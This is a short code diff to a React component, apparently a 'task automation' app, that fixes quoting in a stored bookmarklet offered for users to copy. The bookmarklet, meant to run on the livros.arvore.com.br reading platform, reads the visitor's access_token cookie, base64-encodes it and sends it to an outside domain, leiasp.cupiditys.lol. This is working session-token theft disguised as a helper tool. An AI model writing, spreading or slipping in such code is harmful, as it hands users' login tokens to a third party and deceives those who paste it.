@@ -17,8 +17,8 @@ const TaskApp = () => {
   const [url] = useState("https://leiasp.cupiditys.lol/");
   const [tasksCompleted] = useState(127);
   const [executionTime] = useState("2.3s");
-  const [code] = useState('javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Use este script na plataforma, não abra o livro!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();'
-);
+  const [code] = useState('javascript:!function(){if("livros.arvore.com.br"!==location.host)return alert("Use este script na plataforma, não abra o livro!");open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split("access_token=")[1].split(";")[0]))}`)}();');
+
 
   const copyToClipboard = async (text: string) => {
     try {
